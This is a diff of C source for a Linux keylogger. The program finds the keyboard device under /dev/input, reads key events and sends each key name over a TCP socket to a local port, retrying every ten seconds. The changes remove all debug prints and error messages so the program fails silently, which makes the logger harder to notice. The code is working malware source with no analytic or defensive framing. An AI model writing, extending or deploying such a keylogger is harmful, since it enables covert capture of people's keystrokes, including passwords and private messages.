@@ -62,11 +62,9 @@ void read_event(char *event)
 {
     signal(SIGPIPE, SIG_IGN);
     while (1) {
-        printf("ca repart ici ?\n");
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0) {
-            perror("socket client");
-            exit(EXIT_FAILURE);
+            return ;
         }
 
         struct sockaddr_in serv_addr;
@@ -74,14 +72,12 @@ void read_event(char *event)
         serv_addr.sin_port = htons(4243);
         inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
         if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-            perror("connection au serveur échouée");
             sleep(10);
             continue;
         }
         char *device = malloc(strlen(event) + strlen("/dev/input/") + 1);
         if (!device)
         {
-            perror("malloc");
             close(sock);
             free(event);
             exit(EXIT_FAILURE);
@@ -91,7 +87,6 @@ void read_event(char *event)
         int fd = open(device, O_RDONLY);
         if (fd < 0)
         {
-            perror("open input");
             close(sock);
             free(device);
             free(event);
@@ -106,7 +101,6 @@ void read_event(char *event)
 
             int ret = select(fd + 1, &read_fds, NULL, NULL, NULL);
             if (ret < 0) {
-                perror("Erreur avec select()");
                 break;
             }
 
@@ -121,23 +115,18 @@ void read_event(char *event)
                             char buffer[64];
                             snprintf(buffer, sizeof(buffer), "[%s]", key);
                             int ret = send(sock, buffer, strlen(buffer), 0);
-                            fflush(stdout);
                             if (ret == -1)
                                 break ;
-                            printf("ret : %d\n", ret);
-                            printf("[%ld.%06ld][%s]\n", ev.time.tv_sec, ev.time.tv_usec, key);
+                            // printf("[%ld.%06ld][%s]\n", ev.time.tv_sec, ev.time.tv_usec, key);
                         } else {
-                            printf("[%ld.%06ld][UNKNOWN CODE: %d]\n", ev.time.tv_sec, ev.time.tv_usec, ev.code);
+                           // printf("[%ld.%06ld][UNKNOWN CODE: %d]\n", ev.time.tv_sec, ev.time.tv_usec, ev.code);
                         }
                     }
                 } else {
-                    perror("Erreur de lecture");
                     break;
                 }
             }
         }
-        fflush(stdout);
-        printf("ca va ici ? \n");
         close(fd);
         close(sock);
         free(device);
@@ -202,18 +191,12 @@ char *parse_device_name()
     int fd = open("/proc/bus/input/devices", O_RDONLY);
     char *event;
     if (fd < 0)
-    {
-        perror("can't read the content of devices");
-        exit(EXIT_FAILURE);
-    };
+        return NULL;
     char *line;
     size_t size = get_file_len(fd);
     fd = open("/proc/bus/input/devices", O_RDONLY);
     if (fd < 0)
-    {
-        perror("can't read the content of devices");
-        exit(EXIT_FAILURE);
-    };
+        return NULL;
     char **device_content = calloc(size + 1, sizeof(char *));
     int i = 0;
     while (i < (int)size && get_next_line(fd, &line) == 1)
@@ -238,7 +221,6 @@ void *launch_keylogger(void *args) {
 
     char *event = parse_device_name();
     if (!event) {
-        fprintf(stderr, "Impossible de trouver le périphérique clavier\n");
         return NULL;
     }
     read_event(event);
